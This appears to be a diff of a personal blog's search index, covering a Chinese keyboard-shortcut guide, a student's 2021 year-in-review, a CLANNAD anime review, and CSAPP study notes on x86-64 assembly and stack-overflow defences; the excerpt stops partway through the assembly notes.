+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>mma</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二一——再见，鼠标</title>
+    <url>/2021/10/24/1024.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>为了提高工作效率，以及出于对手腕健康的考虑（现在已经有一定程度的肿胀磨损）。在这个<strong>特殊的日子</strong>，我鼠标的最后一点电耗尽之际，我决心抛弃鼠标，将<strong>几乎</strong>所有的操作全部转移到键盘上。</p>
+<span id="more"></span>
+<p>其实相对于普通的电脑使用者来说，我使用鼠标的频率还是比较低的（大概20%的时间，其中大部分都贡献在浏览网页上），然而时不时花个两三秒的时间去点击一个链接还是让我很不爽。</p>
+<p>如果有朝一日我能真正摆脱对鼠标与触控板的依赖，并熟练使用vim，效率甚至比使用鼠标的人高，那便是再好不过的事情了。</p>
+<h1 id="shortcuts"><a href="#shortcuts" class="headerlink" title="shortcuts"></a>shortcuts</h1><p>使用快捷键来代替鼠标的几次点击是最常用，也最重要的键盘操作方式。</p>
+<p>除了Ctrl-C，Ctrl-V，Win+E，Win+R，Ctrl+Alt+Del这类<strong>妇孺皆知</strong>的快捷键以外，还有系统的各种快捷键、应用快捷键等成百上千种快捷键，在等待着我们的学习。</p>
+<h2 id="system-Win"><a href="#system-Win" class="headerlink" title="system (Win)"></a>system (Win)</h2><p>下面说一下我最常用的（上面写的除外）：</p>
+<p>Tab——没这个你怎么移动光标</p>
+<p>↑↓←→——没这个你怎么移动光标</p>
+<p>Ctrl+Shift+Esc——任务管理器</p>
+<p>Ctrl+Shirt+N——新建文件夹</p>
+<p>Win+number——打开在任务栏的程序</p>
+<p>Win+Shift+number——重新打开一个</p>
+<p>Win+X——一些比较常用的功能</p>
+<p>Win+I——设置</p>
+<p>Win+L——注销（防机惨）</p>
+<p>Win+Q——搜索</p>
+<p>Win+Shift+S——截图</p>
+<p>Alt+Tab——在窗口间切换</p>
+<p>Alt+Shift——切换输入法语言</p>
+<p>Alt+F4——关闭窗口</p>
+<p>Alt+Space+X——最大化</p>
+<p>Alt+Space+N——最小化</p>
+<p>Alt+Space+R——还原</p>
 <blockquote>
-<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
+<p>tips:<br>①如果你安装了everything/火萤酱/listary之类的工具（别安火萤视频桌面，有证据表明它不安全），你可以双击Ctrl来快速搜索应用，效率大增。</p>
+<p>②Win+R的一些常用的程序名也得记住，如cmd、winver、control、taskmgr、netplwiz、appwiz.cpl、inetcpl.cpl、services.msc、compmgmt.msc等等（这里边程序名基本是英文或者英文缩写，所以大家英语必须要学好才行）</p>
 </blockquote>
-<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
-<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
-<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
+<p>其实系统方面的快捷键还是比较好掌握的，尤其是有了工具的加成，用键盘玩转Win难度其实不大。</p>
+<h2 id="browser-Chrome"><a href="#browser-Chrome" class="headerlink" title="browser (Chrome)"></a>browser (Chrome)</h2><p>浏览器这边就相对来说麻烦一点，因为随便一个网页都有可能有几十上百个超链接，单纯利用Tab键来找到自己想要的页面太费时了。对于chrome来说，有一个好用的插件叫<em>vimium</em>（英文含义是像Vim编辑器一样操作），可以将这些繁琐的操作进行一些简化。</p>
 <blockquote>
-<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
+<p>对于vimium，我最常用的快捷键很少，只有以下几个：<br>①f键，可以将页面的超链接与字母进行对应，输入字母就可以跳转到链接。<br>②j键向下滚动，k键向上滚动。（其实PgUp与PgDn也不错）</p>
 </blockquote>
-<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
-<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
+<p>至于浏览器本身的操作，常用的有以下几个：</p>
+<p>Tab——虽然找超链接不好用，但是填表用这个还是很香的</p>
+<p>F12——懂的都懂</p>
+<p>Ctrl+T——新建标签页</p>
+<p>Ctrl+Shirt+T——恢复关闭的标签页</p>
+<p>Ctrl+W——关闭标签页</p>
+<p>Ctrl+number——切换标签页</p>
+<p>Alt+D/F6——切换到地址栏</p>
+<p>Alt+←/→——后退/前进页面</p>
+<p>Ctrl+D——收藏页面</p>
+<p>Ctrl+F——搜索文本</p>
+<p>Ctrl+H——历史记录</p>
+<p>Ctrl+J——显示下载（自从用IDM后就弃坑了）</p>
+<p>Ctrl+Shift+O——显示收藏夹（这个有点麻烦，找了一会儿才找到）</p>
+<p>？？？——显示设置（只能在地址里输chrome://settings?）</p>
+<p>？？？——显示扩展程序（只能在地址里输chrome://extensions?）</p>
+<h2 id="applications"><a href="#applications" class="headerlink" title="applications"></a>applications</h2><p>（这里只讨论非uwp应用。）</p>
+<p>Alt——光标跳到菜单栏（然后你可以使用方向键定位，也可以按首字母直接跳转对应的菜单）</p>
+<p>Esc——返回</p>
+<p>Ctrl+A——全选</p>
+<p>Ctrl+F——搜索</p>
+<p>Ctrl+N——新建</p>
+<p>Ctrl+O——打开</p>
+<p>Ctrl+S——保存</p>
+<p>Shift+Ctrl+S——另存为</p>
+<p>Ctrl+X——剪切</p>
+<blockquote>
+<p>对devcpp选手：</p>
+<p>F11：编译运行</p>
+<p>F4：断点</p>
+<p>F5：调试/继续</p>
+<p>F7：下一步</p>
+<p>F8：单步进入</p>
+<p>Ctrl+/：添加注释</p>
+<p>对vs/vsc选手：</p>
+<p>Alt+num：切换标签（跟chrome的Ctrl+num相同）</p>
+<p>Ctrl+Alt+N：编译运行</p>
+<p>F9：断点</p>
+<p>F5：调试/继续</p>
+<p>F10：下一步</p>
+<p>F11：单步进入</p>
+<p>Ctrl+/：添加注释</p>
+<p>对vim选手：</p>
+<p>（等学会了再更）</p>
+</blockquote>
+<p>只要不是垃圾的国产软件，大多快捷键会在软件的菜单栏标出来（如图）。每一个软件都会有些自己独特的快捷键，大量记忆就是摆脱鼠标要过的最难一关。当然，善用Alt键与Tab键还是能解决大多数问题，只不过速度要慢一点。</p>
+<p><img src="/2021/10/24/1024/1024.png"></p>
+<p>（但是我现在还不知道如何只用键盘截图只截一部分，这是键盘操作的一个痛点）</p>
+<h2 id="console"><a href="#console" class="headerlink" title="console"></a>console</h2><p>↑/↓——上/下一条命令</p>
+<p>Ctrl+C——中断命令</p>
+<p>Ctrl+V——Win粘贴文本</p>
+<p>Ctrl+Shift+V——linux粘贴文本</p>
+<p>Ctrl+A——Win全选、linux光标移到首位</p>
+<p>Ctrl+E——linux光标移到最后</p>
+<h1 id="alternative"><a href="#alternative" class="headerlink" title="alternative"></a>alternative</h1><p>如果迫不得已要使用键盘无法操作的功能，如crop the screenshot，<del>play games</del>等。需要键盘临时模拟鼠标的话，可以按Alt+Shirt+Numlock来启动鼠标键功能。</p>
+<p>“5”是左键，“+”是右键。</p>
+<p>“5”周围的8个键代表8个方向。</p>
+<p>“0”代表按住，”.”代表释放。</p>
+<blockquote>
+<p>“-“代表右键，”*“代表左右双键，“/”为恢复”5”单击鼠标左键的功能（感觉没啥用）。</p>
+</blockquote>
+<p>因为鼠标键移动的速度很慢，所以这项功能并不是很实用。</p>
+<h1 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h1><p>要想摆脱对鼠标的依赖，就尽早转linux吧。祝各位1024程序员节快乐！</p>
+<h1 id="Updated-on-11-2"><a href="#Updated-on-11-2" class="headerlink" title="Updated on 11,2"></a>Updated on 11,2</h1><p>不得不说网易就**离谱，我用IDM插件白嫖mooc的视频，网易没有检测到。但凡我想用个vimium插件，用键盘点个超链接，就给我弹出这个：</p>
+<p><img src="/2021/10/24/1024/forbidden.png"></p>
+<p>说白了，想做安全，却连最基本的知识产权保护都做不到，开发人员是否得反思一下呢？</p>
 ]]></content>
       <categories>
         <category>随笔</category>
@@ -346,6 +320,32 @@
 <p>So please cherish the last year of your senior high. It’s truly the purest time of your whole life.</p>
 <p><strong>Another thing is the distance between my dream and the reality.</strong> I’m very suitable for my current profession because I’m skilled in math, English and programming. Also, I’m satisfied with my current place and my family are proud of me. However, the path to my dream becomes more and more blurred and my avarice for money (I believe a high salary is waiting for me) prevents me from achieving it. Maybe in the rest of my life I could only daydream it, which makes me feel gloomy with a bit of melancholy.</p>
 <p>Lastly, I sincerely congratulate her and hope her could achieve the dream. After all, unlike olympiad which tests agility and cleverness, learning serious math requires very tough work, at least 10 times harder than my profession. I also hope myself could get out of the woods and reach a new altitude. At that time, maybe I will find the way to my dream again.</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Twenty-four——my summary of year 2021</title>
+    <url>/2021/12/30/bye2021.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
+<p><img src="/2021/12/30/bye2021/2021.png"></p>
+<span id="more"></span> 
+<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
+<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
+<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
+<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
+<blockquote>
+<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
+</blockquote>
+<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
+<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
+<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
+<blockquote>
+<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
+</blockquote>
+<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
+<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
 ]]></content>
       <categories>
         <category>随笔</category>
@@ -590,6 +590,187 @@
       </tags>
   </entry>
   <entry>
+    <title>Twenty-three——review of CLANNAD (anime)</title>
+    <url>/2021/11/17/clannad.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>Followed by my last English post “bewilderment”, I’m thrilling to find the right path to go on. I suddenly realized that during my high school times, one of my roommates recommended me to watch CLANNAD (short for CL later). I refused for overwhelming pressure several months before college entrance examination. But now I’m free but depressed, I think it’s just the time to watch it in order to guide my heart. </p>
+<p>This is the 3rd anime I watched besides <em>Working Cells</em> and <em>Future Diary</em>. After ten days striving not to weep, I succeeded. Unlike others said that the anime brings you tears, I prefer it gives you warmth and courage during rough times. (Maybe I haven’t been struggling in a hard situation so there’s no empathy for me to cry.) CL, as is shown in title, tells a story of several families, the transformation through time. It’s just a brief summary of life, although kind of idealized.</p>
+<p>I’m here to talk about some profound sentences and try to seize the essence of the story, otherwise they would be erode by time again.</p>
+<span id="more"></span>
+<p><strong>The English meaning of word “clannad” is “family”</strong>, so all of these sentences have something to do with the significance of family and companion, which run through all scenarios of the story. </p>
+<p>(SPOILER WARNING!!!)</p>
+<p><strong>What makes you not degenerate is neither talent nor love, but the family, or someone who can control yourself. </strong></p>
+<p>Responsibility is one of the main topic CL wants to convey. It is also responsibility that makes Tomoya changed himself from a bad guy to a great father. For instance, before his encounter with Nagisa, he hated this town and treated everything meaningless. <strong>“Because of her, my life eventually filled with color again.”</strong> Therefore he determined to care her as long as he could. From a boy hating school, to a man with high EQ, and finally a wonderful father, the responsibility he took totally transformed himself. </p>
+<p>This is the same for Nagisa. Due to her poor health (a cold is like cancer for her while nothing for Yuno instead uh-huh), she was often absent. What’s more she was also introvert and few classmates noticed her. Therefore, she had almost no friends. The appearance of Tomoya encouraged her to be outgoing and to <strong>go and find whatever she wants</strong>. With Tomoya and his friends’ help, Nagisa rebuilt the drama club, performed her favorite drama story, and made her and her family’s dream come true.</p>
+<p><img src="/2021/11/17/clannad/392528.png"></p>
+<p>In CLANNAD ~AFTER STORY~ (short for CL-2 later), Nagisa passed away because of dystocia (difficult birth). Losing his beloved wife made Tomoya numb, he refused to raise his daughter Ushio, instead, he resorted to alcohol and cigarettes just for escaping from the unrecoverable wound, the intangible past. After 5 years, Ushio happened to have a trip with Tomoya. An unexpected talk with grandma aroused him as role of a father, which made him finally find out <strong>“the one and only precious thing worthwhile to be care for”</strong> asked by Nagisa. He knew what it means to be a father at last.  </p>
+<p>The “confinement” and unbelievable change of Tomoya and Nagisa can move everyone who watched CL by heart. Maybe it is just a kind of feeling —— growth, maturity and family.</p>
+<p><strong>The dream of kids is the dream of family, we didn’t give up our dreams, we just find a sustenance on your dream. That’s how parents do and how family do.</strong></p>
+<p>Dream is also an important main idea during the story. On the last night of school anniversary, Nagisa found that her parents gave up their dream to raise her up. She was so regretful and nervous that she sobbed in her drama program the next day. At the critical moment, her father rushed up to tell her don’t be self-criticized and on the contrary, stick to the drama show in hand, for this is the expectation of the whole family. I believe it is one of the most moving scene because it is awfully true in today’s world. Parents have sacrificed a lot for our growth, isn’t it?  </p>
+<p>The most controversial character is Tomoya’s father Naoyuki. He seems to be useless and hampered Tomoya’s life. As Tomoya’s closest relative, the plot didn’t uncover his background for a long time. That’s because only Tomoya himself also becomes a father can he experience the difficulty of his father. The situation of two fathers is just the same —— losing the most important half in their life. However, Naoyuki didn’t give up raising Tomoya, instead he always bought toys and snacks to bring up his son. When his son grew up, he has already lost money, job, opportunity —— everything. He was so painful that he only had a benevolent smile. In this way, Naoyuki is truly an honorable father.</p>
+<p><strong>There are something awful that happened in our lives, however the fine moments, when time passes, will be sent down and remain in your hand.</strong></p>
+<p>The last main topic of CL is happiness and love. The legend of the town is about the glowing ball. It only appears when someone feels happy and beloved and people who gain the shining thing could make their dream come true. To move a step closer, if the town has its own thoughts, it is people who love this town makes the town happy, and the town loves the people living in it. Therefore, the town realized Tomoya’s dream and the miracle happened. </p>
+<p>We all know that when seniors recall their whole lives, they remember their delighted moments clearly. This plot also tells us that only the happy things won’t be washed away by time. So don’t be blue when life beats you, please think that there are more possibilities in future and lots of uncovered happiness are waiting for us. Also, always be grateful and helpful to others, as one day they may help you realize your dream. </p>
+<p>By the way, how residents treat others expanded the definition of word “family”, and this is a symbol of Mo Theory —— to love others equally without distinction. However, this is kind of biased from our topic so I don’t want to expand it.</p>
+<p>In general, CL has brought me the inner strength that I lacked in the past. I finally know how much my family love me and they’re always cheering me up. However, it doesn’t tell me how to find my way, it just motivates me to <strong>follow my own heart</strong>. I wonder if I would have some new feelings after several years to watch CL again. I’m looking forward to that day comes.</p>
+<p><img src="/2021/11/17/clannad/R.jpg"></p>
+<blockquote>
+<p>PS: </p>
+<ul>
+<li>only 30% of bilibili users have watched the true ending (Tomoya tells Ushio about his life). That’s kind of disappointing. </li>
+<li>To practice my listening skills and get more details, I’m watching CL English dubbed version for a second time.</li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>（近期不更新）csapp学习笔记</title>
+    <url>/2022/01/15/csapp.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>（本文汇编代码统一采用AT&amp;T语法）</p>
+<blockquote>
+<p>友情提示：</p>
+<p>看这本书，笔记、习题、实验三者缺一不可。</p>
+<p>如果你觉得中文翻译质量欠佳，想选择英文原版阅读，那么千万不要选择Global Edition！因为Global Edition的习题环节错误百出，有许多题答案根本无法与题目相对应，严重影响阅读体验和对知识的理解！（我就是白嫖了github上面的免费资源，虽然不是影印版，而且正文质量很高，但习题这个问题就可以盖过其他所有优点）。我现在不得不边看英文原文边做中文版本上的习题(lll￢ω￢)</p>
+</blockquote>
+<span id="more"></span>
+<h1 id="计算机系统漫游"><a href="#计算机系统漫游" class="headerlink" title="计算机系统漫游"></a>计算机系统漫游</h1><p>一个接下所有章节的outline，<del>可以作为计算机系统导论的复习材料。</del></p>
+<h1 id="信息的表示和处理"><a href="#信息的表示和处理" class="headerlink" title="信息的表示和处理"></a>信息的表示和处理</h1><p>之前草草看过一遍，没做题，现在都搞不清楚浮点数的<strong>最小/最大非规格化数</strong>和<strong>最小/最大规格化数</strong>是怎么算出来的。</p>
+<p>有空再填坑。</p>
+<h1 id="程序的机器级表示"><a href="#程序的机器级表示" class="headerlink" title="程序的机器级表示"></a>程序的机器级表示</h1><h2 id="历史观点"><a href="#历史观点" class="headerlink" title="历史观点"></a>历史观点</h2><p>讲了一下Intel处理器的历史，顺便提了一下SSE和AVX指令集（我觉得自己将来都要学的，又要开始秃头了(lll￢ω￢)</p>
+<h2 id="程序编码"><a href="#程序编码" class="headerlink" title="程序编码"></a>程序编码</h2><p>如何在linux环境下查看gcc编译的AT&amp;T格式的汇编代码。（其实gdb提供了变更格式为intel的操作）</p>
+<h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><ul>
+<li>char</li>
+<li>short</li>
+<li>int</li>
+<li>long（即long long，下同）</li>
+<li>float</li>
+<li>double</li>
+<li>指针（本书是64位环境，所有指针均为8字节）</li>
+</ul>
+<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p>各种寄存器（rax~rdx，rsi，rdi，rbp，rsp，r8~r15，及对应的32位、16位、8位版本）及<strong>约定俗成的</strong>用法见下图。</p>
+<p><img src="/2022/01/15/csapp/reg.png"></p>
+<p>mov指令（movq、movl、movw、movb、movzbw、movsbq等，后两者是类型强转）。</p>
+<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><p>lea——取地址，外加简单算术指令，类似于a+b*c的形式（表示字节数的q、l、w、b字母省略，下同）</p>
+<p>sf、zf、pf、cf、af、of——各种标志符(flag)</p>
+<p>add、sub、(i)mul、(i)div、shl(sal)、shr、sar——改变flag状态</p>
+<p>inc、dec——不改变flag状态</p>
+<p>cqto——64位转128位，做128位除法有用</p>
+<h2 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h2><p>if、switch、while、do-while、for的汇编实现，这部分作业错误尤其多。</p>
+<p>由于cpu具有分支预测的功能（部分语句准确率可达90%），简单if语句会预先计算两种分支之后寄存器的变化，以提高cpu的运行速度。</p>
+<p>对于多分支、取值接近的switch语句，编译器会构造跳表来代替各种jz、jbe等判断语句，以提高代码执行效率，因为跳表的执行速度不受分支个数的影响。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>再一次复习堆栈调用的汇编实现，将一个栈帧的各个部分（return address, saved registers, local variables, argument build area）都讲到了，很细致。</p>
+<p>64位寄存器传参的顺序为<code>%rdi</code>,<code>%rsi</code>,<code>%rdx</code>,<code>%rcx</code>,<code>%r8</code>,<code>%r9</code>.</p>
+<h2 id="数组分配和访问"><a href="#数组分配和访问" class="headerlink" title="数组分配和访问"></a>数组分配和访问</h2><p>lea指令的作用就是专门为访问数组设计的。</p>
+<p>虽然编译器更喜欢使用指针遍历数组，加上一个固定的值。即使是多维数组遍历，也尽量不用我们数据结构课学到的i*Wid+j这个公式——毕竟乘法太费时间了。</p>
+<h2 id="异数的数据结构——1-15-2022"><a href="#异数的数据结构——1-15-2022" class="headerlink" title="异数的数据结构——1/15/2022"></a>异数的数据结构——1/15/2022</h2><p>讲了struct、union和空间对齐。</p>
+<p><strong>union中的大小是其中最大数据类型的大小。</strong></p>
+<p>使用union可以强转数据类型（比如说把double转成unsigned long）。</p>
+<p>结构体中的每一项数据的地址都必须是其类型大小的整数倍。</p>
+<h2 id="在机器级程序中将控制与数据结合起来——1-16-2022"><a href="#在机器级程序中将控制与数据结合起来——1-16-2022" class="headerlink" title="在机器级程序中将控制与数据结合起来——1/16/2022"></a>在机器级程序中将控制与数据结合起来——1/16/2022</h2><p>指针与地址运算的优先级——判断以下程序的输出结果：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">20</span>]=&#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *p=&amp;arr;</span><br><span class="line">	*(p+<span class="number">8</span>)+=<span class="number">9</span>;</span><br><span class="line">	<span class="keyword">int</span> m=*((<span class="keyword">char</span>*)p+<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> n=*((<span class="keyword">char</span>*)(p+<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,m,n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>答案是<code>8 11</code>.</p>
+<p>int (*p)(int, *int)——函数指针，用<code>p = fun</code>调用，用<code>res = p(int, &amp;int)</code>返回int。</p>
+<p>int *p(int, *int)——指针函数，返回一个int*指针。</p>
+<p>gdb的各种调试命令（对于安了peda的人，就b、si、ni、x/s、x/wx可能有点用，因为peda把寄存器、汇编、堆栈啥都给你显示完了）：</p>
+<p><img src="/2022/01/15/csapp/gdb.png"></p>
+<blockquote>
+<p>习题3.46的<strong>正文</strong>错误：</p>
+<p>global edition: <code>get_line</code> is called with the return address equal to <del>0x400776</del> 0x400076.</p>
+<p>Chinese edition: 字符 0~9 的 ASCII 码是 <del>0x3~0x39</del> 0x30~0x39.</p>
+</blockquote>
+<p>在堆栈图中，地址从下到上，从右到左逐渐增大。因此对于一个dword(qword)，数据的储存方式是从左到右（小端序）；而单个字节的储存方式是从右到左。</p>
+<blockquote>
+<p>疑问：</p>
+<p>D题中，当<code>get_line</code>函数返回时，损毁的寄存器应该还有%rip，而不只是答案所说的%rbx.</p>
+</blockquote>
+<p>防止栈溢出的三种主要方式：地址空间随机化（ASLR）、栈保护（canary）和内存不可执行（NX）。</p>
+<p>对长度可变栈的汇编支持——栈底指针rbp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushq %rbp</span><br><span class="line">movq %rsp, %rbp</span><br><span class="line">;procedure in the function</span><br><span class="line">leave </span><br><span class="line">;movq %rbp, %rsp</span><br><span class="line">;popq %rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p><del>书上说最近的编译器取消了使用栈底指针的惯例</del>实际上，我用最新的编译器，随便写个hello world都会使用栈底指针，这个惯例依旧保持着。</p>
+<blockquote>
+<p>疑问：</p>
+<p>课后习题的B题为什么s2舍入到“最近的8的倍数”，D题为什么“保留s1的偏移量为最近的16的倍数”？</p>
+</blockquote>
+<h2 id="浮点代码——1-19-2022"><a href="#浮点代码——1-19-2022" class="headerlink" title="浮点代码——1/19/2022"></a>浮点代码——1/19/2022</h2><p>寄存器：</p>
+<p>%ymm0~%ymm15是256位的浮点寄存器。</p>
+<p>%xmm0~%xmm15是128位的浮点寄存器，处于ymm的低128位。</p>
+<p>前8个寄存器可视为函数参数（特别地，%xmm0为<strong>约定俗成</strong>的返回值，类似于%rax），后8个由调用者保存。</p>
+<p>在内存与寄存器中移动浮点数：</p>
+<p>movss：移动float（从%xmm移动到一段32位的内存区域，或反之）</p>
+<p>movsd：移动double（从%xmm移动到一段64位的内存区域，或反之）</p>
+<p>在寄存器间移动：</p>
+<p>movaps：打包移动float</p>
+<p>movapd：打包移动double</p>
+<p><strong>与整型寄存器类似，不能将一个内存的值直接移到另一个内存</strong>。</p>
+<p>浮点与整型的转换（src也可以为mem，此处省去）：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>(src type)\(dst type)</th>
+<th>int</th>
+<th>long</th>
+<th>float</th>
+<th>double</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>int</td>
+<td>\\</td>
+<td>cltq</td>
+<td>cvtsi2ssl %eax %xmm0</td>
+<td>cvtsi2sdl %eax %xmm0</td>
+</tr>
+<tr>
+<td>long</td>
+<td>%eax</td>
+<td>\\</td>
+<td>cvtsi2ssq %rax %xmm0</td>
+<td>cvtsi2sdq %rax %xmm0</td>
+</tr>
+<tr>
+<td>float</td>
+<td>cvttss2si %xmm0 %eax</td>
+<td>cvttss2siq %xmm0 %rax</td>
+<td>\\</td>
+<td>cvtss2sd mem %xmm0</td>
+</tr>
+<tr>
+<td>double</td>
+<td>cvttsd2si %xmm0 %eax</td>
+<td>cvttsd2siq %xmm0 %rax</td>
+<td>cvtsd2ss mem %xmm0</td>
+<td>\\</td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p>此处csapp的指令与现行编译器的汇编语法产生了较大分歧，该表以现行标准为准。现列出以下不同点：</p>
+<ol>
